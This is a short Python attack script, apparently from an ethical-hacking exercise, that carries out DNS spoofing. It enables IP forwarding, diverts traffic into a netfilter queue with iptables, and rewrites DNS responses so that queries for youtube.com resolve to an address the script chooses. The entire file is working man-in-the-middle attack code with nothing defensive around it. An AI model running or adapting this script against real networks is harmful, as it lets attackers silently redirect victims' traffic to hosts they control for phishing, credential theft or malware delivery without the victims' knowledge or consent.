#!/usr/bin/env python3


import netfilterqueue
import scapy.all as scapy
import os


os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "youtube.com" in str(qname):
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="142.251.12.93")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    print("[+] Quitting... ")
